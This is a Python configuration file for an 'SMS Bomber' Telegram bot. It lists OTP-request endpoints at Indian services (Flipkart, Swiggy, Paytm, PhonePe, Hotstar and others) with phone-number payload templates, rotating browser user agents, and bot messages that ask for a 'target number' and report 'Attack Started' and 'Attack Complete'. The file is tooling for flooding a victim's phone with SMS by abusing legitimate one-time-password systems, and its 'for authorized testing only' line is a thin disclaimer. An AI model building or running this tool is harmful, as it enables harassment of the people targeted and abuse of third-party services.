#!/usr/bin/env python3
"""
SMS Bomber Bot - Configuration (FIXED)
"""

import os
from dataclasses import dataclass
from typing import List, Dict, Optional


# ==========================================
# SAFE HELPER
# ==========================================

def safe_int(
    value: str,
    default: int = 0,
    min_val: int = 0,
    max_val: int = 1_000_000_000,
) -> int:
    """Safely convert string to int, return default on failure."""
    try:
        v = (value or "").strip()
        if not v:
            return default
        result = int(v)
        if result < min_val or result > max_val:
            return default
        return result
    except (ValueError, TypeError):
        return default




def safe_float(
    value: str,
    default: float = 0.0,
    min_val: float = 0.0,
    max_val: float = 10.0,
) -> float:
    """Safely convert string to float, return default on failure."""
    try:
        v = (value or "").strip()
        if not v:
            return default
        result = float(v)
        if result < min_val or result > max_val:
            return default
        return result
    except (ValueError, TypeError):
        return default

def parse_admin_ids(raw: str) -> List[int]:
    """Parse comma-separated admin IDs and ignore invalid values safely."""
    admin_ids: List[int] = []
    for item in (raw or "").split(","):
        cleaned = item.strip()
        if not cleaned:
            continue
        parsed = safe_int(cleaned, default=-1, min_val=1, max_val=2_147_483_647)
        if parsed > 0:
            admin_ids.append(parsed)
    return admin_ids


# ==========================================
# BOT CONFIGURATION
# ==========================================

@dataclass
class BotConfig:
    TOKEN: str = os.getenv("BOT_TOKEN", "").strip()
    API_ID: int = safe_int(os.getenv("API_ID"), 0)
    API_HASH: str = os.getenv("API_HASH", "").strip()

    @property
    def is_configured(self) -> bool:
        return bool(self.TOKEN) and bool(self.API_ID) and bool(self.API_HASH)

    def missing_vars(self) -> List[str]:
        missing = []
        if not self.TOKEN:   missing.append("BOT_TOKEN")
        if not self.API_ID:  missing.append("API_ID")
        if not self.API_HASH: missing.append("API_HASH")
        return missing


@dataclass
class ChannelConfig:
    USERNAME: str = os.getenv("FORCE_JOIN_CHANNEL", "").strip()
    ID: int = safe_int(os.getenv("FORCE_JOIN_CHANNEL_ID"), 0)

    @property
    def is_configured(self) -> bool:
        return bool(self.USERNAME) and self.ID != 0


# ==========================================
# ADMIN & DATABASE
# ==========================================

ADMIN_IDS: List[int] = [
    *parse_admin_ids(os.getenv("ADMIN_IDS", ""))
]

DATABASE_URL: str = os.getenv("DATABASE_URL", "sqlite:///bomber.db")


# ==========================================
# RATE LIMITING
# ==========================================

class RateLimits:
    MAX_ATTEMPTS_PER_USER: int = safe_int(os.getenv("MAX_ATTEMPTS_PER_USER"), 100, 1, 1000)
    MAX_ATTEMPTS_GLOBAL: int = safe_int(os.getenv("MAX_ATTEMPTS_GLOBAL"), 1000, 1, 100000)
    COOLDOWN_HOURS: int = safe_int(os.getenv("COOLDOWN_HOURS"), 24, 0, 168)
    REQUEST_DELAY: float = safe_float(os.getenv("REQUEST_DELAY"), 1.0, 0.0, 10.0)
    MAX_CONCURRENT_ATTACKS: int = safe_int(os.getenv("MAX_CONCURRENT_ATTACKS"), 5, 1, 100)


# ==========================================
# HTTP CONFIGURATION
# ==========================================

USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
]

DEFAULT_HEADERS: Dict[str, str] = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}


# ==========================================
# OTP ENDPOINTS
# ==========================================

@dataclass
class OTPEndpoint:
    name: str
    url: str
    method: str
    phone_param: str
    headers: Optional[Dict[str, str]] = None
    payload_template: Optional[Dict] = None
    success_indicator: Optional[str] = None
    timeout: int = 10


TARGET_ENDPOINTS: List[OTPEndpoint] = [
    # E-Commerce
    OTPEndpoint(
        name="Flipkart",
        url="https://www.flipkart.com/api/6/user/signup/status",
        method="POST",
        phone_param="loginId",
        headers={"Content-Type": "application/json"},
        payload_template={"loginId": "{phone}", "supportAllStates": True}
    ),
    OTPEndpoint(
        name="Meesho",
        url="https://www.meesho.com/api/v1/auth/otp",
        method="POST",
        phone_param="phone",
        headers={"Content-Type": "application/json"},
        payload_template={"phone": "{phone}", "platform": "web"}
    ),
    # Food Delivery
    OTPEndpoint(
        name="Swiggy",
        url="https://www.swiggy.com/dapi/auth/sms-otp",
        method="POST",
        phone_param="mobile",
        headers={"Content-Type": "application/json"},
        payload_template={"mobile": "{phone}"}
    ),
    OTPEndpoint(
        name="Zomato",
        url="https://www.zomato.com/php/o2_handler.php",
        method="POST",
        phone_param="phone",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        payload_template={"phone": "{phone}", "action": "send_otp"}
    ),
    # Payment Apps
    OTPEndpoint(
        name="Paytm",
        url="https://accounts.paytm.com/v3/api/otp",
        method="POST",
        phone_param="phone",
        headers={"Content-Type": "application/json"},
        payload_template={"phone": "{phone}", "channel": "web"}
    ),
    OTPEndpoint(
        name="PhonePe",
        url="https://www.phonepe.com/api/v1/otp",
        method="POST",
        phone_param="mobileNumber",
        headers={"Content-Type": "application/json"},
        payload_template={"mobileNumber": "{phone}"}
    ),
    # Travel
    OTPEndpoint(
        name="RedBus",
        url="https://www.redbus.in/api/otp",
        method="POST",
        phone_param="mobile",
        headers={"Content-Type": "application/json"},
        payload_template={"mobile": "{phone}"}
    ),
    OTPEndpoint(
        name="MakeMyTrip",
        url="https://www.makemytrip.com/api/otp",
        method="POST",
        phone_param="mobile",
        headers={"Content-Type": "application/json"},
        payload_template={"mobile": "{phone}"}
    ),
    # OTT
    OTPEndpoint(
        name="Hotstar",
        url="https://api.hotstar.com/v2/otp",
        method="POST",
        phone_param="phone",
        headers={"Content-Type": "application/json"},
        payload_template={"phone": "{phone}"}
    ),
]


# ==========================================
# UI MESSAGES
# ==========================================

MESSAGES = {
    "WELCOME": """
🚀 **SMS Bomber Bot**

⚡ High-speed SMS testing tool
📱 Working endpoints: {count}
🛡️ Rate limited for safety

**Commands:**
/start - Start the bot
/help - Show help
/stats - Your statistics

⚠️ **For authorized testing only**
""",

    "FORCE_JOIN": """
⚠️ **Channel Membership Required**

Join {channel} to use this bot.

Click the button below to join, then press Verify.
""",

    "ENTER_PHONE": """
📱 **Enter Target Number**

Format: +91XXXXXXXXXX or 10-digit number

⚠️ Indian numbers only (+91)
""",

    "ENTER_COUNT": """
🔢 **Enter SMS Count**

Min: 1 | Max: {max}
Recommended: 10-50

⏱️ Cooldown: {cooldown}h between uses
""",

    "ATTACK_START": """
🚀 **Attack Started**

📱 Target: `{number}`
🔢 Count: {count}
🌐 Endpoints: {endpoints}

⏳ Sending...
""",

    "ATTACK_COMPLETE": """
✅ **Attack Complete**

📱 Target: `{number}`
📤 Attempted: {attempted}
✅ Success: {success}
❌ Failed: {failed}
⏱️ Duration: {duration:.1f}s
⚡ Rate: {rate:.1f}/s
""",

    "COOLDOWN": """
⏱️ **Cooldown Active**

Please wait {remaining} before next use.

This prevents abuse and protects the service.
""",

    "ERROR": "❌ **Error:** {message}",
    "SUCCESS": "✅ **Success:** {message}",
    "UNAUTHORIZED": "🚫 You are not authorized to use this command.",
}


# ==========================================
# INITIALIZE CONFIGS
# ==========================================

bot_config = BotConfig()
channel_config = ChannelConfig()
rate_limits = RateLimits()
